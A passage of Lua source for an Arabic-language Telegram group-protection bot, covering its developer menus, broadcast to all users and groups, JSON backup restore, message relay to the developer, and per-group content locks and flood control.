{{text = '‹ : مسح المكتومين عام .',data="delmu"},{text ="‹ : مسح المحظورين عام .",data="delbnal"}},
{{text = '‹ : المكتومين عام .',data="lsmu"},{text ="‹ : المحظورين عام .",data="lsbnal"}},
{{text = '‹ : جلب نسخه احتياطيه .',data="GetfJson"},{text = '‹ : رفع نسخه احتياطيه .',data="UpfJson"}},
                {{text = '‹ : تحديث .',data="UpBot"},{text = '‹ : تحديث السورس .',data="UpSu"}},
{{text = '‹ : FSouRce u .',url="t.me/FeLX_TEaM"}},
}
}
return bot.editMessageText(chat_id,msg_id,'*‹ : العدد الكلي ( '..#list..' )\n‹ : تم العثور على ( '..x..' ) من المشتركين الوهميين*', 'md', true, false, reply_dev)
else
return bot.editMessageText(chat_id,msg_id,'*‹ : العدد الكلي ( '..#list.." )\n‹ : لم يتم العثور على وهميين*", 'md', true, false, reply_dev)
end
end
if Text == "clenMg" then
local list = redis:smembers(bot_id..":Groups")   
local x = 0
for k,v in pairs(list) do  
local Get_Chat = bot.getChat(v)
if Get_Chat.id then
local statusMem = bot.getChatMember(Get_Chat.id,bot_id)
if statusMem.status.luatele == "chatMemberStatusMember" then
x = x + 1
bot.sendText(Get_Chat.id,0,'*‹ : البوت ليس ادمن في المجموعه*',"md")
redis:srem(bot_id..":Groups",Get_Chat.id)
local keys = redis:keys(bot_id..'*'..Get_Chat.id)
for i = 1, #keys do
redis:del(keys[i])
end
bot.leaveChat(Get_Chat.id)
end
else
x = x + 1
local keys = redis:keys(bot_id..'*'..v)
for i = 1, #keys do
redis:del(keys[i])
end
redis:srem(bot_id..":Groups",v)
bot.leaveChat(v)
end
end
if x ~= 0 then
reply_dev = bot.replyMarkup{
type = 'inline',data = {
	{{text = '‹ : الاحصائيات .',data="indfo"}},
	{{text = '‹ : تغيير المطور الاساسي .',data="EditDevbot"}},
{{text = '‹ : تغيير اسم البوت .',data="namebot"},{text =(redis:get(bot_id..":namebot") or "لاريكا"),data="delnamebot"}},
{{text = '‹ : تغيير كليشه ستارت .',data="addstarttxt"},{text ="‹ : حذف كليشه ستارت .",data="Deltxtstart"}},
{{text = '‹ : تنظيف المشتركين .',data="clenMsh"},{text ="‹ : تنظيف المجموعات .",data="clenMg"}},
{{text = 'التواصل',data="..."},{text ='اشعارات',data=".."},{text ='الاذاعه',data="...."},{text = 'المغادره',data="..."},{text = 'التعريف',data="..."}},
{{text = ''..Adm_Callback().t..'',data="Twas"},{text = ''..Adm_Callback().n..'',data="Notice"},{text = ''..Adm_Callback().s..'',data="sendbot"},{text = ''..Adm_Callback().d..'',data="Departure"},{text =Adm_Callback().i,data="infobot"}},
{{text = '‹ : الاشتراك الاجباري .',data="chatmem"},{text = '‹ : الاذاعه .',data="sendtomem"}},
{{text = '‹ : مسح المطورين .',data="deldev"},{text ="‹ : مسح الثانويين .",data="delpor"}},
{{text = '‹ : المطورين .',data="lsdev"},{text ="‹ : الثانويين .",data="lspor"}},
{{text = '‹ : مسح المكتومين عام .',data="delmu"},{text ="‹ : مسح المحظورين عام .",data="delbnal"}},
{{text = '‹ : المكتومين عام .',data="lsmu"},{text ="‹ : المحظورين عام .",data="lsbnal"}},
{{text = '‹ : جلب نسخه احتياطيه .',data="GetfJson"},{text = '‹ : رفع نسخه احتياطيه .',data="UpfJson"}},
                {{text = '‹ : تحديث .',data="UpBot"},{text = '‹ : تحديث السورس .',data="UpSu"}},
{{text = '‹ : FSouRce u .',url="t.me/FeLX_TEaM"}},
}
}
return bot.editMessageText(chat_id,msg_id,'*‹ : العدد الكلي ( '..#list..' )\n‹ : تم العثور على ( '..x..' ) من المجموعات الوهميه*', 'md', true, false, reply_dev)
else
return bot.editMessageText(chat_id,msg_id,'*‹ : العدد الكلي ( '..#list.." )\n‹ : لم يتم العثور على مجموعات وهميه*", 'md', true, false, reply_dev)
end
end
if Text == "sendtomem" then
reply_dev = bot.replyMarkup{
type = 'inline',data = {
{{text = '‹ : رساله للكل .',data="AtSer_Tall"},{text ="‹ : توجيه للكل .",data="AtSer_Fall"}},
{{text = '‹ : رساله للمجموعات .',data="AtSer_Tgr"},{text ="‹ : توجيه للمجموعات .",data="AtSer_Fgr"}},
{{text = '‹ : رساله للاعضاء .',data="AtSer_Tme"},{text ="‹ : توجيه للاعضاء .",data="AtSer_Fme"}},
{{text = '‹ : رجوع',data="Can"}},
}
}
bot.editMessageText(chat_id,msg_id,"*‹ : اوامر الاذاعه الخاصه بالبوت*", 'md', true, false, reply_dev)
end
if Text and Text:match("^AtSer_(.*)") then
local infomsg = {Text:match("^AtSer_(.*)")}
iny = infomsg[1]
reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = '‹ : الغاء .',data="Can"}},
}
}
redis:setex(bot_id..":set:"..chat_id..":send",600,iny)  
bot.editMessageText(chat_id,msg_id,"*‹ : قم الان بأرسال الرساله *", 'md', true, false, reply_markup)
end
----------------------------------------------------------------------------------------------------
end
end
----------------------------------------------------------------------------------------------------
-- end function Callback
----------------------------------------------------------------------------------------------------
function Run(msg,data)
if msg.content.text then
text = msg.content.text.text
else 
text = nil
end
----------------------------------------------------------------------------------------------------
if devB(msg.sender.user_id) then
if redis:get(bot_id..":set:"..msg.chat_id..":send") then
TrS = redis:get(bot_id..":set:"..msg.chat_id..":send")
list = redis:smembers(bot_id..":Groups")   
lis = redis:smembers(bot_id..":user_id") 
if msg.forward_info or text or msg.content.video_note or msg.content.document or msg.content.audio or msg.content.video or msg.content.voice_note or msg.content.sticker or msg.content.animation or msg.content.photo then 
redis:del(bot_id..":set:"..msg.chat_id..":send") 
if TrS == "Fall" then
bot.sendText(msg.chat_id,msg.id,"*‹ : يتم توجيه الرساله الى ( "..#lis.." عضو ) و ( "..#list.." مجموعه )  .*","md",true)      
for k,v in pairs(list) do
local FedMsg = bot.forwardMessages(v, msg.chat_id, msg.id,0,0,true,false,false)
if FedMsg then
redis:incr(bot_id..":count:true") 
end
end  
bot.sendText(msg.chat_id,msg.id,"*تمت الاذاعه ل ( "..redis:get(bot_id..":count:true").." ) مجموعه جار الاذاعه للاعضاء  .*","md",true)
redis:del(bot_id..":count:true") 
for k,g in pairs(lis) do  
local FedMsg = bot.forwardMessages(g, msg.chat_id, msg.id,0,0,true,false,false)
if FedMsg then
redis:incr(bot_id..":count:true") 
end
end  
bot.sendText(msg.chat_id,msg.id,"*تمت الاذاعه ل ( "..redis:get(bot_id..":count:true").." ) عضو  .*","md",true)
redis:del(bot_id..":count:true") 
elseif TrS == "Fgr" then
bot.sendText(msg.chat_id,msg.id,"*‹ : يتم توجيه الرساله الى ( "..#list.." مجموعه )  .*","md",true)      
for k,v in pairs(list) do  
local FedMsg = bot.forwardMessages(v, msg.chat_id, msg.id,0,0,true,false,false)
if FedMsg then
redis:incr(bot_id..":count:true") 
end
end  
bot.sendText(msg.chat_id,msg.id,"*تمت الاذاعه ل ( "..redis:get(bot_id..":count:true").." ) مجموعه  .*","md",true)
redis:del(bot_id..":count:true") 
elseif TrS == "Fme" then
bot.sendText(msg.chat_id,msg.id,"*‹ : يتم توجيه الرساله الى ( "..#lis.." عضو )  .*","md",true)      
for k,v in pairs(lis) do
local FedMsg = bot.forwardMessages(v, msg.chat_id, msg.id,0,0,true,false,false)
if FedMsg then
redis:incr(bot_id..":count:true") 
end
end  
bot.sendText(msg.chat_id,msg.id,"*تمت الاذاعه ل ( "..redis:get(bot_id..":count:true").." ) عضو  .*","md",true)
redis:del(bot_id..":count:true") 
elseif TrS == "Tall" then
bot.sendText(msg.chat_id,msg.id,"*‹ : يتم ارسال الرساله الى ( "..#lis.." عضو ) و ( "..#list.." مجموعه )  .*","md",true)      
for k,v in pairs(list) do
local FedMsg = bot.forwardMessages(v, msg.chat_id, msg.id,0,0,true,true,false)
if FedMsg then
redis:incr(bot_id..":count:true") 
end
end  
bot.sendText(msg.chat_id,msg.id,"*تمت الاذاعه ل ( "..redis:get(bot_id..":count:true").." ) مجموعه جار الاذاعه للاعضاء  .*","md",true)
redis:del(bot_id..":count:true") 
for k,v in pairs(lis) do  
local FedMsg = bot.forwardMessages(v, msg.chat_id, msg.id,0,0,true,true,false)
if FedMsg then
redis:incr(bot_id..":count:true") 
end
end  
bot.sendText(msg.chat_id,msg.id,"*تمت الاذاعه ل ( "..redis:get(bot_id..":count:true").." ) عضو  .*","md",true)
redis:del(bot_id..":count:true") 
elseif TrS == "Tgr" then
bot.sendText(msg.chat_id,msg.id,"*‹ : يتم ارسال الرساله الى ( "..#list.." مجموعه )  .*","md",true)      
for k,v in pairs(list) do
local FedMsg = bot.forwardMessages(v, msg.chat_id, msg.id,0,0,true,true,false)
if FedMsg then
redis:incr(bot_id..":count:true") 
end
end  
bot.sendText(msg.chat_id,msg.id,"*تمت الاذاعه ل ( "..redis:get(bot_id..":count:true").." ) مجموعه  .*","md",true)
redis:del(bot_id..":count:true") 
elseif TrS == "Tme" then
bot.sendText(msg.chat_id,msg.id,"*‹ : يتم ارسال الرساله الى ( "..#lis.." عضو )  .*","md",true)      
for k,v in pairs(lis) do
local FedMsg = bot.forwardMessages(v, msg.chat_id, msg.id,0,0,true,true,false)
if FedMsg then
redis:incr(bot_id..":count:true") 
end
end  
bot.sendText(msg.chat_id,msg.id,"*تمت الاذاعه ل ( "..redis:get(bot_id..":count:true").." ) عضو  .*","md",true)
redis:del(bot_id..":count:true") 
end 
return false
end
end
end
----------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------
if bot.getChatId(msg.chat_id).type == "basicgroup" then
if devB(msg.sender.user_id) then
----------------------------------------------------------------------------------------------------
if redis:get(bot_id..":set:"..msg.chat_id..":UpfJson") then
if msg.content.document then
redis:del(bot_id..":set:"..msg.chat_id..":UpfJson") 
local File_Id = msg.content.document.document.remote.id
local Name_File = msg.content.document.file_name
if tonumber(Name_File:match('(%d+)')) ~= tonumber(bot_id) then 
return bot.sendText(msg.chat_id,msg.id,'*‹ : عذرا الملف هذا ليس للبوت*',"md")
end
local File = json:decode(https.request('https://api.telegram.org/bot'..Token..'/getfile?file_id='..File_Id)) 
local download_ = download('https://api.telegram.org/file/bot'..Token..'/'..File.result.file_path,Name_File)
local Get_Info = io.open(download_,"r"):read('*a')
local groups = JSON.decode(Get_Info)
if groups.GrBot.user_id then
for k,user_idr in pairs(groups.GrBot.user_id) do
redis:sadd(bot_id..":user_id",user_idr)  
end
end
if groups.GrBot.Groups then
for k,chat_idr in pairs(groups.GrBot.Groups) do
redis:sadd(bot_id..":Groups",chat_idr)  
end
end
if groups.GrBot.programmer then
for k,pro in pairs(groups.GrBot.programmer) do
redis:sadd(bot_id..":programmer",pro)  
end
end
if groups.GrBot.developer then
for k,ddi in pairs(groups.GrBot.developer) do
redis:sadd(bot_id..":developer",ddi)  
end
end
if groups.GrBot then
for idg,v in pairs(groups.GrBot) do
list ={"Spam","Edited","Hashtak","via_bot_user_id","messageChatAddMembers","forward_info","Links","Markdaun","WordsFshar","Spam","Tagservr","Username","Keyboard","messagePinMessage","messageSenderChat","Cmd","messageLocation","messageContact","messageVideoNote","messagePoll","messageAudio","messageDocument","messageAnimation","AddMempar","messageSticker","messageVoiceNote","WordsPersian","WordsEnglish","JoinByLink","messagePhoto","messageVideo"}
for i,lock in pairs(list) do 
redis:set(bot_id..":"..idg..":settings:"..lock,"del")    
end
if v.Creator then
for k,idcr in pairs(v.Creator) do
redis:sadd(bot_id..":"..idg..":Status:Creator",idcr)
end
end
if v.BasicConstructor then
for k,idbc in pairs(v.BasicConstructor) do
redis:sadd(bot_id..":"..idg..":Status:BasicConstructor",idbc)
end
end
if v.Constructor then
for k,idc in pairs(v.Constructor) do
redis:sadd(bot_id..":"..idg..":Status:Constructor",idc)
end
end
if v.Owner then
for k,idOw in pairs(v.Owner) do
redis:sadd(bot_id..":"..idg..":Status:Owner",idOw)
end
end
if v.Administrator then
for k,idad in pairs(v.Administrator) do
redis:sadd(bot_id..":"..idg..":Status:Administrator",idad)
end
end
if v.Vips then
for k,idvp in pairs(v.Vips) do
redis:sadd(bot_id..":"..idg..":Status:Vips",idvp)
end
end
end
end
bot.sendText(msg.chat_id,msg.id,"*‹ : تم رفع النسخه بنجاح*","md")
end
end
if redis:get(bot_id..":set:"..msg.chat_id..":addCh") then
if msg.forward_info then
redis:del(bot_id..":set:"..msg.chat_id..":addCh") 
if msg.forward_info.origin.chat_id then          
id_chat = msg.forward_info.origin.chat_id
else
bot.sendText(msg.chat_id,msg.id,"*‹ : عذرا يجب عليك ارسل توجيه من قناه فقط .*","md")
return false
end     
sm = bot.getChatMember(id_chat,bot_id)
if sm.status.luatele == "chatMemberStatusAdministrator" then
redis:set(bot_id..":TheCh",id_chat) 
bot.sendText(msg.chat_id,msg.id,"*‹ : تم حفظ القناه بنجاح  .*","md", true)
else
bot.sendText(msg.chat_id,msg.id,"*‹ : البوت ليس مشرف بالقناه .*","md", true)
end
end
end
if redis:get(bot_id..":set:"..msg.chat_id..":dev") then
if text and text:match("^(%d+)$") then
local IdDe = text:match("^(%d+)$")
redis:del(bot_id..":set:"..msg.chat_id..":dev") 
local Inform = io.open("sudo.lua", 'w')
Inform:write([[
return {
	
Token = "]]..Token..[[",

id = ]]..IdDe..[[

}
]])
Inform:close()
end
bot.sendText(msg.chat_id,msg.id,"*‹ : تم تغيير المطور الاساسي بنجاح .*","md", true)
dofile("start.lua")
end
if redis:get(bot_id..":set:"..msg.chat_id..":start") then
if msg.content.text then
redis:set(bot_id..":start",text) 
reply_dev = bot.replyMarkup{
type = 'inline',data = {
	{{text = '‹ : الاحصائيات .',data="indfo"}},
	{{text = '‹ : تغيير المطور الاساسي .',data="EditDevbot"}},
{{text = '‹ : تغيير اسم البوت .',data="namebot"},{text =(redis:get(bot_id..":namebot") or "لاريكا"),data="delnamebot"}},
{{text = '‹ : تغيير كليشه ستارت .',data="addstarttxt"},{text ="‹ : حذف كليشه ستارت .",data="Deltxtstart"}},
{{text = '‹ : تنظيف المشتركين .',data="clenMsh"},{text ="‹ : تنظيف المجموعات .",data="clenMg"}},
{{text = 'التواصل',data="..."},{text ='اشعارات',data=".."},{text ='الاذاعه',data="...."},{text = 'المغادره',data="..."},{text = 'التعريف',data="..."}},
{{text = ''..Adm_Callback().t..'',data="Twas"},{text = ''..Adm_Callback().n..'',data="Notice"},{text = ''..Adm_Callback().s..'',data="sendbot"},{text = ''..Adm_Callback().d..'',data="Departure"},{text =Adm_Callback().i,data="infobot"}},
{{text = '‹ : الاشتراك الاجباري .',data="chatmem"},{text = '‹ : الاذاعه .',data="sendtomem"}},
{{text = '‹ : مسح المطورين .',data="deldev"},{text ="‹ : مسح الثانويين .",data="delpor"}},
{{text = '‹ : المطورين .',data="lsdev"},{text ="‹ : الثانويين .",data="lspor"}},
{{text = '‹ : مسح المكتومين عام .',data="delmu"},{text ="‹ : مسح المحظورين عام .",data="delbnal"}},
{{text = '‹ : المكتومين عام .',data="lsmu"},{text ="‹ : المحظورين عام .",data="lsbnal"}},
{{text = '‹ : جلب نسخه احتياطيه .',data="GetfJson"},{text = '‹ : رفع نسخه احتياطيه .',data="UpfJson"}},
                {{text = '‹ : تحديث .',data="UpBot"},{text = '‹ : تحديث السورس .',data="UpSu"}},
{{text = '‹ : FSouRce u .',url="t.me/FeLX_TEaM"}},
}
}
redis:del(bot_id..":set:"..msg.chat_id..":start") 
bot.sendText(msg.chat_id,msg.id,"*‹ : اهلا بك في قائمه الاوامر : العلامه ( ✅ ) تعني الامر مفعل و ( ❌ ) العكس .*","md", true, false, false, false, reply_dev)
end
end
if redis:get(bot_id..":set:"..msg.chat_id..":namebot") then
if msg.content.text then
redis:del(bot_id..":set:"..msg.chat_id..":namebot") 
redis:set(bot_id..":namebot",text) 
reply_dev = bot.replyMarkup{
type = 'inline',data = {
	{{text = '‹ : الاحصائيات .',data="indfo"}},
	{{text = '‹ : تغيير المطور الاساسي .',data="EditDevbot"}},
{{text = '‹ : تغيير اسم البوت .',data="namebot"},{text =(redis:get(bot_id..":namebot") or "لاريكا"),data="delnamebot"}},
{{text = '‹ : تغيير كليشه ستارت .',data="addstarttxt"},{text ="‹ : حذف كليشه ستارت .",data="Deltxtstart"}},
{{text = '‹ : تنظيف المشتركين .',data="clenMsh"},{text ="‹ : تنظيف المجموعات .",data="clenMg"}},
{{text = 'التواصل',data="..."},{text ='اشعارات',data=".."},{text ='الاذاعه',data="...."},{text = 'المغادره',data="..."},{text = 'التعريف',data="..."}},
{{text = ''..Adm_Callback().t..'',data="Twas"},{text = ''..Adm_Callback().n..'',data="Notice"},{text = ''..Adm_Callback().s..'',data="sendbot"},{text = ''..Adm_Callback().d..'',data="Departure"},{text =Adm_Callback().i,data="infobot"}},
{{text = '‹ : الاشتراك الاجباري .',data="chatmem"},{text = '‹ : الاذاعه .',data="sendtomem"}},
{{text = '‹ : مسح المطورين .',data="deldev"},{text ="‹ : مسح الثانويين .",data="delpor"}},
{{text = '‹ : المطورين .',data="lsdev"},{text ="‹ : الثانويين .",data="lspor"}},
{{text = '‹ : مسح المكتومين عام .',data="delmu"},{text ="‹ : مسح المحظورين عام .",data="delbnal"}},
{{text = '‹ : المكتومين عام .',data="lsmu"},{text ="‹ : المحظورين عام .",data="lsbnal"}},
{{text = '‹ : جلب نسخه احتياطيه .',data="GetfJson"},{text = '‹ : رفع نسخه احتياطيه .',data="UpfJson"}},
                {{text = '‹ : تحديث .',data="UpBot"},{text = '‹ : تحديث السورس .',data="UpSu"}},
{{text = '‹ : FSouRce u .',url="t.me/FeLX_TEaM"}},
}
}
bot.sendText(msg.chat_id,msg.id,"*‹ : اهلا بك في قائمه الاوامر : العلامه ( ✅ ) تعني الامر مفعل و ( ❌ ) العكس .*","md", true, false, false, false, reply_dev)
end
end
if text == "/start" then 
bot.sendText(msg.chat_id,msg.id,"*‹ : اهلا بك في قائمه الاوامر : العلامه ( ✅ ) تعني الامر مفعل و ( ❌ ) العكس .*","md", true, false, false, false, bot.replyMarkup{
type = 'inline',data = {
	{{text = '‹ : الاحصائيات .',data="indfo"}},
	{{text = '‹ : تغيير المطور الاساسي .',data="EditDevbot"}},
{{text = '‹ : تغيير اسم البوت .',data="namebot"},{text =(redis:get(bot_id..":namebot") or "لاريكا"),data="delnamebot"}},
{{text = '‹ : تغيير كليشه ستارت .',data="addstarttxt"},{text ="‹ : حذف كليشه ستارت .",data="Deltxtstart"}},
{{text = '‹ : تنظيف المشتركين .',data="clenMsh"},{text ="‹ : تنظيف المجموعات .",data="clenMg"}},
{{text = 'التواصل',data="..."},{text ='اشعارات',data=".."},{text ='الاذاعه',data="...."},{text = 'المغادره',data="..."},{text = 'التعريف',data="..."}},
{{text = ''..Adm_Callback().t..'',data="Twas"},{text = ''..Adm_Callback().n..'',data="Notice"},{text = ''..Adm_Callback().s..'',data="sendbot"},{text = ''..Adm_Callback().d..'',data="Departure"},{text =Adm_Callback().i,data="infobot"}},
{{text = '‹ : الاشتراك الاجباري .',data="chatmem"},{text = '‹ : الاذاعه .',data="sendtomem"}},
{{text = '‹ : مسح المطورين .',data="deldev"},{text ="‹ : مسح الثانويين .",data="delpor"}},
{{text = '‹ : المطورين .',data="lsdev"},{text ="‹ : الثانويين .",data="lspor"}},
{{text = '‹ : مسح المكتومين عام .',data="delmu"},{text ="‹ : مسح المحظورين عام .",data="delbnal"}},
{{text = '‹ : المكتومين عام .',data="lsmu"},{text ="‹ : المحظورين عام .",data="lsbnal"}},
{{text = '‹ : جلب نسخه احتياطيه .',data="GetfJson"},{text = '‹ : رفع نسخه احتياطيه .',data="UpfJson"}},
                {{text = '‹ : تحديث .',data="UpBot"},{text = '‹ : تحديث السورس .',data="UpSu"}},
{{text = '‹ : FSouRce u .',url="t.me/FeLX_TEaM"}},
}
})
end 
----------------------------------------------------------------------------------------------------
end
----------------------------------------------------------------------------------------------------
if text == "/start" and not devB(msg.sender.user_id) then
if redis:get(bot_id..":Notice") then
if not redis:sismember(bot_id..":user_id",msg.sender.user_id) then
scarduser_id = redis:scard(bot_id..":user_id") +1
bot.sendText(sudoid,0,Reply_Status(msg.sender.user_id,"*‹ : قام بدخول الى البوت عدد اعضاء البوت الان ( "..scarduser_id.." ) .*").i,"md",true)
end
end
redis:sadd(bot_id..":user_id",msg.sender.user_id)  
local reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = '‹ : لـ تنصيب البوتات .',url="https://t.me/sSs_sSs"}},
{{text = '‹ : اضفني الى مجموعتك .',url="https://t.me/"..bot.getMe().username.."?startgroup=new"}},
{{text = '‹ : FSouRce u .',url="t.me/FeLX_TEaM"}},
}
}
if redis:get(bot_id..":start") then
r = redis:get(bot_id..":start")
else
r ="*‹ : اهلا بك عزيزي انا لاريكا .\n‹ : لحمايه المجموعات ومميزات خدميه اخرى .\n‹ : ارفعي مشرف في كروبك وارسل تفعيل .\n‹ : سيتم رفع المالك والادمنيه تلقائيا .*"
end
return bot.sendText(msg.chat_id,msg.id,r,"md", true, false, false, false, reply_markup)
end
if not Bot(msg) then
if not devB(msg.sender.user_id) then
if msg.content.text then
if text ~= "/start" then
if redis:get(bot_id..":Twas") then 
if not redis:sismember(bot_id.."banTo",msg.sender.user_id) then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,'*‹ : تم ارسال رسالتك الى المطور*').yu,"md",true)
local FedMsg = bot.sendForwarded(sudoid, 0, msg.chat_id, msg.id)
if FedMsg and FedMsg.content and FedMsg.content.luatele == "messageSticker" then
bot.sendText(IdSudo,0,Reply_Status(msg.sender.user_id,'*‹ : قام بارسال الملصق*').i,"md",true)  
return false
end
else
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,'*‹ : انت محظور من البوت*').yu,"md",true)  
end
end
end
end
end
end
if devB(msg.sender.user_id) and msg.reply_to_message_id ~= 0  then    
local Message_Get = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
if Message_Get.forward_info then
if Message_Get.forward_info.origin.sender_user_id then          
id_user = Message_Get.forward_info.origin.sender_user_id
end    
if text == 'حظر' then
bot.sendText(msg.chat_id,0,Reply_Status(id_user,'*‹ : تم حظره بنجاح*').i,"md",true)
redis:sadd(bot_id.."banTo",id_user)  
return false  
end 
if text =='الغاء الحظر' then
bot.sendText(msg.chat_id,0,Reply_Status(id_user,'*‹ : تم الغاء حظره بنجاح*').i,"md",true)
redis:srem(bot_id.."banTo",id_user)  
return false  
end 
if msg.content.video_note then
bot.sendVideoNote(id_user, 0, msg.content.video_note.video.remote.id)
elseif msg.content.photo then
if msg.content.photo.sizes[1].photo.remote.id then
idPhoto = msg.content.photo.sizes[1].photo.remote.id
elseif msg.content.photo.sizes[2].photo.remote.id then
idPhoto = msg.content.photo.sizes[2].photo.remote.id
elseif msg.content.photo.sizes[3].photo.remote.id then
idPhoto = msg.content.photo.sizes[3].photo.remote.id
end
bot.sendPhoto(id_user, 0, idPhoto,'')
elseif msg.content.sticker then 
bot.sendSticker(id_user, 0, msg.content.sticker.sticker.remote.id)
elseif msg.content.voice_note then 
bot.sendVoiceNote(id_user, 0, msg.content.voice_note.voice.remote.id, '', 'md')
elseif msg.content.video then 
bot.sendVideo(id_user, 0, msg.content.video.video.remote.id, '', "md")
elseif msg.content.animation then 
bot.sendAnimation(id_user,0, msg.content.animation.animation.remote.id, '', 'md')
elseif msg.content.document then
bot.sendDocument(id_user, 0, msg.content.document.document.remote.id, '', 'md')
elseif msg.content.audio then
bot.sendAudio(id_user, 0, msg.content.audio.audio.remote.id, '', "md") 
elseif msg.content.text then
bot.sendText(id_user,0,text,"md",true)
end 
bot.sendText(msg.chat_id,msg.id,Reply_Status(id_user,'*‹ : تم ارسال رسالتك اليه*').i,"md",true)  
end
end
end
----------------------------------------------------------------------------------------------------
if bot.getChatId(msg.chat_id).type == "supergroup" then 
if redis:sismember(bot_id..":Groups",msg.chat_id) then
if not BasicConstructor(msg) then
if redis:get(bot_id..":"..msg.chat_id..":settings:forward_info") then
if msg.forward_info then
if redis:get(bot_id..":"..msg.chat_id..":settings:forward_info") == "del" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:forward_info") == "ked" then
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:forward_info") == "ktm" then
redis:sadd(bot_id..":"..msg.chat_id..":settings:mute",msg.sender.user_id) 
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:forward_info") == "kick" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : تم قفل التوجيه في المجموعه .*").yu,"md",true)  
end
end
if msg.content.luatele == "messageContact"  then
if redis:get(bot_id..":"..msg.chat_id..":settings:"..msg.content.luatele) == "del" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:"..msg.content.luatele) == "ked" then
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:"..msg.content.luatele) == "ktm" then
redis:sadd(bot_id..":"..msg.chat_id..":settings:mute",msg.sender.user_id) 
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:"..msg.content.luatele) == "kick" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end
end
if msg.content.luatele == "messageChatAddMembers" then
Info_User = bot.getUser(msg.content.member_user_ids[1]) 
redis:set(bot_id..":"..msg.chat_id..":"..msg.content.member_user_ids[1]..":AddedMe",msg.sender.user_id)
redis:incr(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Addedmem")
if Info_User.type.luatele == "userTypeBot" or Info_User.type.luatele == "userTypeRegular" then
if redis:get(bot_id..":"..msg.chat_id..":settings:AddMempar") then 
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
bot.setChatMemberStatus(msg.chat_id,msg.content.member_user_ids[1],'restricted',{1,0,0,0,0,0,0,0,0})
redis:sadd(bot_id..":"..msg.chat_id..":settings:mute",msg.sender.user_id) 
redis:sadd(bot_id..":"..msg.chat_id..":settings:mute",msg.content.member_user_ids[1]) 
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
bot.setChatMemberStatus(msg.chat_id,msg.content.member_user_ids[1],'banned',0)
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
end
end
if redis:get(bot_id..":"..msg.chat_id..":settings:"..msg.content.luatele) then
if Info_User.type.luatele == "userTypeBot" then
redis:sadd(bot_id..":"..msg.chat_id..":settings:mute",msg.content.member_user_ids[1]) 
redis:sadd(bot_id..":"..msg.chat_id..":settings:mute",msg.sender.user_id) 
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
bot.setChatMemberStatus(msg.chat_id,msg.content.member_user_ids[1],'restricted',{1,0,0,0,0,0,0,0,0})
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
bot.setChatMemberStatus(msg.chat_id,msg.content.member_user_ids[1],'banned',0)
end
end
end
end
if not Vips(msg) then
if redis:hget(bot_id.."Spam:Group:User"..msg.chat_id,"Spam:User") then
if msg.content.luatele ~= "messageChatAddMembers"  then 
local floods = redis:hget(bot_id.."Spam:Group:User"..msg.chat_id,"Spam:User") or "nil"
local Num_Msg_FeLX = redis:hget(bot_id.."Spam:Group:User"..msg.chat_id,"floodtime") or 5
local post_count = tonumber(redis:get(bot_id.."Spam:Cont"..msg.sender.user_id..":"..msg.chat_id) or 0)
if post_count >= tonumber(redis:hget(bot_id.."Spam:Group:User"..msg.chat_id,"floodtime") or 5) then 
if redis:hget(bot_id.."Spam:Group:User"..msg.chat_id,"Spam:User") == "kick" then 
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : قام بالتكرار في المجموعه وتم حظره .*").yu,"md",true)
elseif redis:hget(bot_id.."Spam:Group:User"..msg.chat_id,"Spam:User") == "del" then 
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:hget(bot_id.."Spam:Group:User"..msg.chat_id,"Spam:User") == "ked" then
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : قام بالتكرار في المجموعه وتم تقييده .*").yu,"md",true)
elseif redis:hget(bot_id.."Spam:Group:User"..msg.chat_id,"Spam:User") == "ktm" then
redis:sadd(bot_id.."SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : قام بالتكرار في المجموعه وتم كتمه .*").yu,"md",true)  
end
end
redis:setex(bot_id.."Spam:Cont"..msg.sender.user_id..":"..msg.chat_id, tonumber(5), post_count+1) 
Num_Msg_FeLX = 5
if redis:hget(bot_id.."Spam:Group:User"..msg.chat_id,"floodtime") then
